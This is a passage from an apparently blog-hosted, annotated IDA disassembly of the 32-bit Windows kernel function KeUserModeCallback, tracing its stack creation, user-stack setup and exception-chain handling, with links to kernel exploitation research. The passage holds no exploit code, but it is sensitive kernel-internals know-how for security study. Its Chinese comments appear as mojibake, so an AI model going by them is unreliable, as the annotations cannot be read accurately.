class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// KeUserModeCallback (</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN ULONG ApiNumber,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN PVOID InputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN ULONG InputLength,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     OUT PVOID *OutputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN PULONG OutputLength</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     )</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// Attributes: bp-based frame</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// int __stdcall KeUserModeCallback(int, void *, size_t, int, int)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80                 <span class="keyword">public</span> _KeUserModeCallback@<span class="number">20</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 _KeUserModeCallback@<span class="number">20</span> proc near</span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_3C          = dword ptr <span class="number">-3</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TrapFrame2  = dword ptr <span class="number">-38</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_HardwareEsp2= dword ptr <span class="number">-34</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TEBGdiBatchCount= dword ptr <span class="number">-30</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_2C_0_R3ExceptionList= dword ptr <span class="number">-2</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_CurrentThread= dword ptr <span class="number">-28</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_NewStackBaseAddress= dword ptr <span class="number">-24</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_HardwareEsp = dword ptr <span class="number">-20</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TrapFrame   = dword ptr <span class="number">-1</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 ms_exc          = CPPEH_RECORD ptr <span class="number">-18</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_ApiNumber   = dword ptr  <span class="number">8</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_InputBuffer_returnStatus= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_InputLength_R3ExceptionList= dword ptr  <span class="number">10</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_OutputBuffer= dword ptr  <span class="number">14</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_OutputLength= dword ptr  <span class="number">18</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// FUNCTION CHUNK AT PAGE:008F6C8E SIZE 000000B8 BYTES</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// __unwind &#123; // __except_handler4</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80                 mov     edi, edi</span><br><span class="line">PAGE:<span class="number">007</span>EDA82                 push    ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDA83                 mov     ebp, esp</span><br><span class="line">PAGE:<span class="number">007</span>EDA85                 push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line">PAGE:<span class="number">007</span>EDA87                 push    offset stru_69FD80</span><br><span class="line">PAGE:<span class="number">007</span>EDA8C                 push    offset __except_handler4 <span class="comment">// å®‰è£…SEH</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA91                 mov     eax, large fs:_KPCR</span><br><span class="line">PAGE:<span class="number">007</span>EDA97                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDA98                 sub     esp, <span class="number">2</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA9B                 push    ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDA9C                 push    esi</span><br><span class="line">PAGE:<span class="number">007</span>EDA9D                 push    edi</span><br><span class="line">PAGE:<span class="number">007</span>EDA9E                 mov     eax, ___security_cookie</span><br><span class="line">PAGE:<span class="number">007</span>EDAA3                 <span class="keyword">xor</span>     [ebp+ms_exc.registration.ScopeTable], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAA6                 <span class="keyword">xor</span>     eax, ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDAA8                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAA9                 lea     eax, [ebp+ms_exc.registration]</span><br><span class="line">PAGE:<span class="number">007</span>EDAAC                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAB2                 mov     [ebp+ms_exc.old_esp], esp</span><br><span class="line">PAGE:<span class="number">007</span>EDAB5                 mov     [ebp+var_2C_0_R3ExceptionList], <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDABC                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">PAGE:<span class="number">007</span>EDAC3                 mov     [ebp+var_CurrentThread], esi</span><br><span class="line">PAGE:<span class="number">007</span>EDAC6                 test    [esi+_KTHREAD.___u18.MiscFlags], <span class="number">1000</span>h <span class="comment">// CurrentThread.CalloutActive == 1?</span></span><br><span class="line">PAGE:<span class="number">007</span>EDACD                 jnz     loc_8F6C8E      <span class="comment">// MiscFlags.CalloutActive == 1ï¼ŒKeBugCheckExè“å±</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAD3                 mov     edi, ds:__imp__KeGetCurrentIrql@<span class="number">0</span> <span class="comment">// KeGetCurrentIrql()</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAD9                 call    edi <span class="comment">// KeGetCurrentIrql()</span></span><br><span class="line">PAGE:<span class="number">007</span>EDADB                 test    al, al</span><br><span class="line">PAGE:<span class="number">007</span>EDADD                 jnz     loc_8F6C9F      <span class="comment">// IRQL != PASSIVE_LEVCEL, KeBugCheckExè“å±</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE3                 mov     cl, [esi+_KTHREAD.___u49.__s1.ApcStateIndex]</span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                 test    cl, cl          <span class="comment">// ApcStateIndex:</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                                         <span class="comment">// 0 æ­£å¸¸çŠ¶æ€</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                                         <span class="comment">// 1 æŒ‚é çŠ¶æ€</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAEB                 jnz     loc_8F6D2E      <span class="comment">// å½“å‰çº¿ç¨‹å¤„äºæŒ‚é çŠ¶æ€ã€å†…æ ¸APCå·²ç¦ç”¨ï¼ŒKeBugCheckEx</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAF1                 cmp     dword ptr [esi+_KTHREAD.___u42.__s4.KernelApcDisable], <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAF8                 jnz     loc_8F6D2E      <span class="comment">// å½“å‰çº¿ç¨‹å¤„äºæŒ‚é çŠ¶æ€ã€å†…æ ¸APCå·²ç¦ç”¨ï¼ŒKeBugCheckEx</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAFE                 mov     cl, [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel]</span><br><span class="line">PAGE:<span class="number">007</span>EDB04                 mov     al, cl</span><br><span class="line">PAGE:<span class="number">007</span>EDB06                 inc     al              <span class="comment">// KeUserModeCallbackæ¯è°ƒç”¨ä¸€æ¬¡ï¼Œå›è°ƒåµŒå¥—æ·±åº¦ +1</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB08                 mov     [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel], al</span><br><span class="line">PAGE:<span class="number">007</span>EDB0E                 cmp     al, <span class="number">1F</span>h         <span class="comment">// å›è°ƒåµŒå¥—æœ€å¤§æ·±åº¦ä¸º 0x1F = 31</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB10                 ja      loc_8F6CB4      <span class="comment">// return STATUS_STACK_OVERFLOW(0xC00000FD)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB16                 mov     eax, [esi+_KTHREAD.___u49.__s1.IdealProcessor]</span><br><span class="line">PAGE:<span class="number">007</span>EDB1C                 mov     eax, ds:_KiProcessorBlock[eax*<span class="number">4</span>] <span class="comment">// KiProcessorBlock æ˜¾ç¤ºå…¶å¯¹åº”çš„KPCRBç»“æ„ä½“çš„åœ°å€</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB23                 mov     eax, [eax+_KPRCB.ParentNode] <span class="comment">// _KNODEç»“æ„ï¼Œè·Ÿ NUMA å†…å­˜ç®¡ç†æ–¹å¼æœ‰å…³</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB23                                         <span class="comment">// https://saturn35.com/2019/07/22/ç¿»è¯‘-Kernel-Pool-Exploitation-on-Windows-7-By-Tarjei-Mandt/</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB29                 push    esi</span><br><span class="line">PAGE:<span class="number">007</span>EDB2A                 movzx   edx, [eax+_KNODE.___u13.__s1.NodeNumber]</span><br><span class="line">PAGE:<span class="number">007</span>EDB31                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB33                 call    _MmCreateKernelStack@<span class="number">12</span> <span class="comment">// ===================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// åˆ›å»º64KBå¤§å°çš„å†…å­˜ç©ºé—´ï¼Œç”¨äºçº¿ç¨‹åœ¨å†…æ ¸ç©ºé—´çš„å †æ ˆå¤§å°</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// è¿”å›å€¼æ˜¯æ ˆåº•ï¼Œé«˜åœ°å€ï¼ˆè·Ÿå¸¸è§„åˆ†é…ä¸€å—å†…å­˜è¿”å›å†…å­˜ä½åœ°å€ä¸åŒï¼‰</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// æ¨æ–­æ˜¯å¿«é€Ÿè°ƒç”¨ï¼Œå‚æ•°ä¸‰æ˜¯IdealProcessor</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// PVOID NTAPI MmCreateKernelStack(IN BOOLEAN GuiStack,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">//                     IN UCHAR Node, IN ULON IdealProcessor)//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// ===================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                 mov     [ebp+var_NewStackBaseAddress], eax <span class="comment">// åœ¨å†…æ ¸ç©ºé—´åˆ›å»ºä¸€ä¸ªå†…æ ¸æ ˆï¼Œè¿”å›å€¼æ˜¯æ ˆåº•StackBaseï¼Œé«˜åœ°å€ï¼ˆè·Ÿå¸¸è§„åˆ†é…ä¸€å—å†…å­˜è¿”å›å†…å­˜ä½åœ°å€ä¸åŒï¼‰</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                                         <span class="comment">// ä» Vista å¼€å§‹ï¼Œæ¯æ¬¡å›è°ƒåˆ°ç”¨æˆ·ç©ºé—´éƒ½ä¼šç»™çº¿ç¨‹æ–°å»ºä¸€ä¸ªçº¿ç¨‹æ ˆâ€”â€”ã€ŠBH_US_11_Mandt_win32k_ Slidesã€‹</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                                         <span class="comment">// å°†åŸå…ˆçº¿ç¨‹æ ˆä¿å­˜åï¼Œç„¶åå°†çº¿ç¨‹æ ˆä¿¡æ¯æ‹·è´è¿‡æ¥ã€‚</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3B                 test    eax, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                 jz      loc_8F6CC4      <span class="comment">// ç”±äºæš‚æ—¶ä¸çŸ¥é“çº¿ç¨‹æ ˆç»“æ„ï¼Œå…ˆç”¨ä»¥ä¸‹æ–¹å¼æ ‡è®°æ ˆçš„å˜åŒ–</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ====================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// æ ˆåº•ï¼šStackBase</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// æ ˆé¡¶ï¼šKSTACK_CONTROL.ActualLimit</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// æ ˆå¤§å°ï¼šKeKernelStackSize</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ActualLimit = StackBase - KeKernelStackSize//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// pKeepStackBase = StackBase - 0x20//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// pKeepStackTop = pKeepStackBase + 4//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// *(DWORD*)pKeepStackBase = StackBase//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// *(DWORD*)pKeepStackTop = ActualLimit//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ====================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB43                 lea     ecx, [eax<span class="number">-20</span>h]</span><br><span class="line">PAGE:<span class="number">007</span>EDB46                 mov     [ecx+_KSTACK_CONTROL.StackBase], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB48                 sub     eax, ds:_KeKernelStackSize <span class="comment">// æ ˆçš„å¤§å°ä¸º KeKernelStackSize</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB48                                         <span class="comment">// æ­¤æ—¶ eax æŒ‡å‘æ ˆé¡¶</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB4E                 mov     [ecx+_KSTACK_CONTROL.___u1.ActualLimit], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB51                 mov     eax, [esi+_KTHREAD.StackBase] <span class="comment">// æ ˆçš„åŸºå€ï¼Œå‡½æ•°è°ƒç”¨æ—¶ä¼šå˜åŒ–ï¼Œebp</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB51                                         <span class="comment">// KernelStackï¼Œæ ˆé¡¶ï¼Œesp</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB54                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.StackBase], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB57                 mov     eax, [esi+_KTHREAD.StackLimit] <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB5A                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.StackLimit], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB5D                 mov     eax, [esi+_KTHREAD.InitialStack] <span class="comment">// åŸå§‹æ ˆåº•ï¼Œè¯¥å€¼ä¸ºæ ˆåˆ†é…å‡ºæ¥æ—¶çš„æ ˆåº•</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB60                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.InitialStack], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB63                 mov     eax, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDB66                 mov     [ebp+var_TrapFrame], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB69                 mov     [ebp+var_TrapFrame2], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB6C                 mov     ecx, [eax+_KTRAP_FRAME.HardwareEsp] <span class="comment">// esp3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB6F                 mov     [ebp+var_HardwareEsp], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB72                 mov     [ebp+var_HardwareEsp2], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB75                 mov     eax, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDB78                 add     eax, <span class="number">3</span>          <span class="comment">// å°†è¾“å…¥ç¼“å†²åŒºçš„é•¿åº¦è¿›è¡Œ 4 å­—èŠ‚å¯¹é½</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB7B                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFFFFFCh</span><br><span class="line">PAGE:<span class="number">007</span>EDB7E                 add     eax, <span class="number">1</span>Ch        <span class="comment">// ç¼“å†²åŒºé•¿åº¦ += 0x1C//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB81                 mov     ebx, ecx        <span class="comment">// ebx = ecx = HardwareEsp(esp3)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                 sub     ebx, eax        <span class="comment">// ============================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// è¿™é‡Œæ˜¯æŠ¬å‡ HardwareEspï¼ˆesp3ï¼‰ï¼Œå³æŠ¬å‡ 3 ç¯å †æ ˆ</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// çŒœæµ‹æ˜¯å³å°†è¦å°†å‚æ•° InputBuffer çš„æ•°æ®æ‹·è´è‡³ 3 ç¯å †æ ˆä¸­</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// æ‹·è´çš„æ€»æ•°æ®é•¿åº¦æ˜¯ InputLength + 0x1Cï¼Œè¿™é‡Œçš„ 0x1C åº”è¯¥æ˜¯ä¸€äº›å­˜æ”¾</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// ç”¨æ¥æè¿° InputBuffer çš„ç»“æ„/æ•°æ®</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// ============================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB85                 <span class="keyword">and</span>     ebx, <span class="number">0F</span>FFFFFFCh <span class="comment">// åŒæ ·çš„å…ˆå°†å †æ ˆçš„å¤§å°è¿›è¡Œ 4 å­—èŠ‚å¤§å°å¯¹é½</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB88 <span class="comment">//   __try &#123; // __except at loc_8F6D16</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB88                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span> <span class="comment">// è¿›å…¥ _try</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB8F                 push    <span class="number">4</span>               <span class="comment">// Alignment</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB91                 push    eax             <span class="comment">// Length</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB92                 push    ebx             <span class="comment">// Address</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB93                 call    _ProbeForWrite@<span class="number">12</span> <span class="comment">// ProbeForWrite(x,x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB98                 lea     edi, [ebx+<span class="number">1</span>Ch]  <span class="comment">// edi æŒ‡å‘ HardwareEsp çš„ä½ç½®</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB9B                 push    [ebp+arg_InputLength_R3ExceptionList] <span class="comment">// size_t</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB9E                 push    [ebp+arg_InputBuffer_returnStatus] <span class="comment">// void *</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA1                 push    edi             <span class="comment">// void *</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA2                 call    _memcpy         <span class="comment">// è¿™é‡Œå°† 0 ç¯ InputBuffer çš„æ•°æ®æ‹·è´è‡³ 3 ç¯çš„å †æ ˆ</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA7                 add     esp, <span class="number">0</span>Ch        <span class="comment">// ä¸ºä»€ä¹ˆè¦å°† esp æå‡ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBAA                 mov     [ebx+<span class="number">8</span>], edi    <span class="comment">// ä»è¿™é‡Œå¼€å§‹å¡«å…… 3 ç¯å †æ ˆä¸­å¯¹é‚£ 0x1C çš„ä½ç½®è¿›è¡Œå¡«å……</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBAD                 mov     eax, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDBB0                 mov     [ebx+<span class="number">0</span>Ch], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBB3                 mov     eax, [ebp+arg_ApiNumber]</span><br><span class="line">PAGE:<span class="number">007</span>EDBB6                 mov     [ebx+<span class="number">4</span>], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBB9                 mov     eax, [ebp+var_HardwareEsp]</span><br><span class="line">PAGE:<span class="number">007</span>EDBBC                 mov     [ebx+<span class="number">18</span>h], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBBF                 mov     ecx, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDBC2                 mov     eax, [ecx+_KTRAP_FRAME._Eip] <span class="comment">// åŸå…ˆçš„ Old_Eip3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBC5                 mov     [ebx], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBC7                 mov     eax, [esi+_KTHREAD.Teb] <span class="comment">// ä¸æ›´æ–° 3 ç¯çš„TEBï¼ˆå¼‚å¸¸é“¾æ¡ï¼‰ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBCD                 mov     eax, [eax]      <span class="comment">// å–3ç¯å¼‚å¸¸é“¾æ¡çš„åœ°å€ï¼Œèµ‹å€¼ç»™eax</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBCF                 mov     [ebp+arg_InputLength_R3ExceptionList], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBD2                 mov     [ebp+var_2C_0_R3ExceptionList], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBD2 <span class="comment">//   &#125; // starts at 7EDB88</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBD5                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh <span class="comment">// ä» _try é‡Œå‡ºæ¥åˆ°æœ€å¤–å±‚</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                 mov     [ecx+_KTRAP_FRAME.HardwareEsp], ebx <span class="comment">// ====================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// æ›´æ–° esp3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// è¿™é‡Œçš„ ebx ä¸ºæ–°çš„ esp3ï¼Œå›è°ƒåˆ° 3 ç¯æ—¶ä½¿ç”¨ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// ====================ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDF                 mov     ebx, [ebp+var_NewStackBaseAddress]</span><br><span class="line">PAGE:<span class="number">007</span>EDBE2                 push    ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDBE3                 lea     eax, [ebx<span class="number">-20</span>h]  <span class="comment">// å‡0x20æ˜¯å› ä¸ºï¼šè¿™0x20å­—èŠ‚é‡Œé¢å­˜äº†åŸå§‹ç³»çº¿ç¨‹å †æ ˆç›¸å…³çš„å†…å®¹</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBE3                                         <span class="comment">// å¦‚CurrentThread.StackBaseç­‰</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBE6                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBE7                 push    [ebp+arg_OutputLength]</span><br><span class="line">PAGE:<span class="number">007</span>EDBEA                 push    [ebp+arg_OutputBuffer]</span><br><span class="line">PAGE:<span class="number">007</span>EDBED                 call    _KiCallUserMode@<span class="number">16</span> <span class="comment">// KiCallUserMod (</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   *OutputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PULONG  OutputLength,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   pPreviousThreadStack,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   pNewStackBaseAddress</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">// )</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF2                 mov     edi, eax        <span class="comment">// NTSTATUS</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF4                 mov     [ebp+arg_InputBuffer_returnStatus], edi</span><br><span class="line">PAGE:<span class="number">007</span>EDBF7 <span class="comment">//   __try &#123; // __except at loc_8F6CDA</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF7                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">1</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBFE                 cmp     edi, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC04                 jz      <span class="keyword">short</span> loc_7EDC11</span><br><span class="line">PAGE:<span class="number">007</span>EDC06                 mov     eax, [esi+_KTHREAD.Teb]</span><br><span class="line">PAGE:<span class="number">007</span>EDC0C                 mov     ecx, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDC0F                 mov     [eax+_TEB.NtTib.ExceptionList], ecx <span class="comment">// æ¢å¤åŸå…ˆçš„3ç¯å¼‚å¸¸é“¾æ¡</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC11</span><br><span class="line">PAGE:<span class="number">007</span>EDC11 loc_7EDC11:                             <span class="comment">// 